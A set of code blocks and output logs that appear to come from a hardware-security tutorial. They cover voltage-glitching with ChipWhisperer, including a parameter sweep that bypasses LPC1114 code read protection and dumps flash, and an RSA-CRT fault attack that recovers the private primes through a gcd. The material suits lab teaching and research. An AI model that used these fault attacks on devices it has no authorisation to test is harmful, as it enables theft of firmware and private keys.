["```\nvoid glitch_infinite(void)\n{\n    char str[64];\n    unsigned int k = 0;\n    //Declared volatile to avoid optimizing away loop.\n    //This also adds lots of SRAM access\n  1 volatile uint16_t i, j;\n  2 volatile uint32_t cnt;\n    while(1) {\n cnt = 0;\n      3 trigger_high();\n      4 for(i = 0; i < 200; i++){\n            for(j = 0; j < 200; j++){\n                cnt++;\n            }\n        }\n        trigger_low();\n      5 sprintf(str, \"%lu %d %d %d\\n\", cnt, i, j, k++);\n        uart_puts(str);\n    }\n}\n```", "```\nPLATFORM=\"CWNANO\"\n%run \"Helper_Scripts/Setup_Generic.ipynb\"\np = prog()\np.scope = scope\np.open() #Open and find attached STM32F0 target\np.find()\np.erase() #Erase it!\np.close()\ntarget.dis()\nscope.dis()\n```", "```\nnxpdev = CWDevice(scope, target, print_debug=True)\n\n#Need to enter ISP mode before initializing programmer object\nnxpdev.isp_mode()\nnxpp = nxpprog.NXP_Programmer(\"lpc1114\", nxpdev, 12000)\n\n#Examples of stuff you can do:\nprint(nxpp.get_serial_number())\nprint(nxpp.read_block(0, 4))\n```", "```\nWrite: ?\nRead: Synchronized\nWrite: b'Synchronized\\r\\n'\nRead: Synchronized\nRead: OK\nWrite: b'12000\\r\\n'\nRead: 12000\nRead: OK\nWrite: b'A 0\\r\\n'\nRead: A 0\nRead: 0\nWrite: b'U 23130\\r\\n'\nRead: 0\nWrite: b'N\\r\\n'\nRead: 0\nRead: 218316836\nRead: 2935817382\nRead: 1480765853\nRead: 4110424384\n218316836 2935817382 1480765853 4110424384\nWrite: b'R 0 4\\r\\n'\nRead: 19\n**OSError**: 'R 0 4' error: 19 - CODE_READ_PROTECTION_ENABLED: Code read protection enabled\n```", "```\ndef set_crp(nxpp, value, image=None):\n    \"\"\"\n    Set CRP value - requires the first 4096 bytes of FLASH due to\n    page size!\n    \"\"\"\n\n    if image is None:\n        f = open(r\"external/lpc1114_first4096.bin\", \"rb\")\n        image = f.read()\n        f.close()\n\n    image = list(image)\n    image[0x2fc] = (value >> 0)  & 0xff\n    image[0x2fd] = (value >> 8)  & 0xff\n    image[0x2fe] = (value >> 16) & 0xff\n    image[0x2ff] = (value >> 24) & 0xff\n\n    print(\"Programming flash...\")\n    nxpp.prog_image(bytes(image), 0)\n    print(\"Done!\")\n```", "```\nnxpdev = CWDevice(scope, target, print_debug=True)\n\n#Need to enter ISP mode before initializing programmer object\nnxpdev.isp_mode()\nnxpp = nxpprog.NXP_Programmer(\"lpc1114\", nxpdev, 12000)\nset_crp(nxpp, 0x12345678)\n```", "```\nimport matplotlib.pylab as plt\n\n#Enter ISP Mode\nnxpdev.isp_mode()\n\n#Sample at 20 MS/s (maximum for CW-Nano)\nscope.adc.clk_freq = 20E6\nscope.adc.samples = 2000\n\n#Reset again and perform a power capture\nscope.io.nrst = 'low'\nscope.arm()\ntime.sleep(0.05)\nscope.io.nrst = 'high'\nscope.capture()\n\n#Plot Waveform\ntrace = scope.get_last_trace()\nplt.plot(trace)\nplt.show()\n```", "```\n#ChipWhisperer-Nano uses count of fixed-frequency oscillator, so these values\n#don't directly correlate with the timing of the power analysis graphs.\nscope.glitch.repeat = 15\nscope.glitch.ext_offset = 1400\n```", "```\nimport time\nprint(\"Attempting to glitch LPC Target\")\n\nnxpdev = CWDevice(scope, target)\n\nRange = namedtuple(\"Range\", [\"min\", \"max\", \"step\"])\n\n# Empirically these seemed to work OK, we want to hit around\n# time 51.8 to 51.9 Î¼s from reset. CW-Nano doesn't have as meaningful\n# timebase as CW-Lite, so we just sweep larger ranges...\noffset_range = Range(5600, 6050, 1)\nrepeat_range = Range(9, 15, 1)\n\nscope.glitch.repeat = repeat_range.min\n\ndone = False\nwhile done == False:\n    scope.glitch.ext_offset = offset_range.min\n    if scope.glitch.repeat >= repeat_range.max:\n        scope.glitch.repeat = repeat_range.min\n    while scope.glitch.ext_offset < offset_range.max:\n\n        scope.io.nrst = 'low'\n        time.sleep(0.05)\n        scope.arm()\n scope.io.nrst = 'high'\n        target.ser.flush()\n\n        print(\"Glitch offset %4d, width %d........\"%\n                (scope.glitch.ext_offset, scope.glitch.repeat), end=\"\")\n\n        time.sleep(0.05)\n        try:\n            nxpp = nxpprog.NXP_Programmer(\"lpc1114\", nxpdev, 12000)\n\n            try:\n              1 data = nxpp.read_block(0, 4)\n                print(\"[SUCCESS]\\n\")\n                print(\"  Glitch OK! Add code to dump here.\")\n                done = True\n                break\n\n            except IOError as e:\n                #print(e)\n                print(\"[NORMAL]\")\n\n        except IOError:\n            print(\"[FAILED]\")\n            pass\n\n        scope.glitch.ext_offset += offset_range.step\n\n    scope.glitch.repeat += repeat_range.step\n```", "```\nAttempting to glitch LPC Target\nGlitch offset 5700, width 9........[NORMAL]\nGlitch offset 5701, width 9........[NORMAL]\nGlitch offset 5702, width 9........[NORMAL]\nGlitch offset 5703, width 9........[NORMAL]\nGlitch offset 5704, width 9........[NORMAL]\nGlitch offset 5705, width 9........[NORMAL]\nGlitch offset 5706, width 9........[NORMAL]\nGlitch offset 5707, width 9........[NORMAL]\n   ---`MANY MORE TESTS`---\nGlitch offset 5729, width 9........[SUCCESS]\n\n  Glitch OK! Beginning dump...\n00 08 00 10 D1 1D 00 00 CB 1F 00 00 CB 1F 00 00\nCB 1F 00 00 CB 1F 00 00 CB 1F 00 00 38 3B FF EF\n00 00 00 00 00 00 00 00 00 00 00 00 CB 1F 00 00\nCB 1F 00 00 00 00 00 00 CB 1F 00 00 CB 1F 00 00\n```", "```\nAttempting to glitch LPC Target\nGlitch offset 5700, width 5........[NORMAL]\n   ---`MANY MORE TESTS`---\nGlitch offset 5722, width 5........[NORMAL]\nGlitch offset 5723, width 5........[NORMAL]\nGlitch offset 5724, width 5........[NORMAL]\nGlitch offset 5725, width 5........[NORMAL]\nGlitch offset 5726, width 5........[NORMAL]\nGlitch offset 5727, width 5........[NORMAL]\nGlitch offset 5728, width 5........[SUCCESS]\n\n  Glitch OK! Beginning dump...\n00 08 00 10 D1 1D 00 00 CB 1F 00 00 CB 1F 00 00\nCB 1F 00 00 CB 1F 00 00 CB 1F 00 00 38 3B FF EF\n00 00 00 00 00 00 00 00 00 00 00 00 CB 1F 00 00\nCB 1F 00 00 00 00 00 00 CB 1F 00 00 CB 1F 00 00\nCB 1F 00 00 CB 1F 00 00 CB 1F 00 00 CB 1F 00 00\nCB 1F 00 00 CB 1F 00 00 CB 1F 00 00 CB 1F 00 00\nCB 1F 00 00 CB 1F 00 00 CB 1F 00 00 CB 1F 00 00\n```", "```\n|00|01|ff...|00|`hash_prefix`|`message_hash`|\n```", "```\n|00|01|ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff|003031300d060960864801650304020105000420|7f83b165ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069|\n```", "```\nfrom tqdm import tnrange\nfor i in tnrange(7000000, 7100000):\n    scope.glitch.ext_offset = i\n    target.flush()\n    scope.arm() # arm the glitch to occur at ext_offset\n    target.write(\"t\\n\") # this starts signature operation and triggers counter\n    scope.capture() # wait for trigger/counter to finish\n `--snip--`\n```", "```\n1187B790564D43D48CD140A7FF890EEA713D1603D8CBC57CF070EE951479C75E93FE98AD04F535109D957F9AB9\nAA25DB2FB1A5521C68C986A270782B7A579A12B9AE79DF2F59ED9E6694C64C40AAD9FE46B203DB75792016EE\nA315F7CAA8F9AAC0FD89052FFAC29C022E32B541B150419E2B6604DDA6BF2582F62C9F7876393D\n```", "```\n# Recover p and q from corrupted signature and correct signature\ncalc_q = gcd(s_crt_x - s_crt, N)\ncalc_p = N // calc_q\nprint(\"Recovered p using s: {}\".format(hex(calc_p)))\nprint(\"Recovered q using s: {}\".format(hex(calc_q)))\nprint(\"pq == N?             {}\".format(calc_q * calc_p == N))\n```", "```\nRecovered p using s: 0xc36d0eb7fcd285223cfb5aaba5bda3d82c01cad19ea484a87ea4377637e75500fcb2005c5c7dd6ec4ac023cda285d796c3d9e75e1efc42488bb4f1d13ac30a57\nRecovered q using s: 0xc000df51a7c77ae8d7c7370c1ff55b69e211c2b9e5db1ed0bf61d0d9899620f4910e4168387e3c30aa1e00c339a795088452dd96a9a5ea5d9dca68da636032af\npq == N?             True\n```"]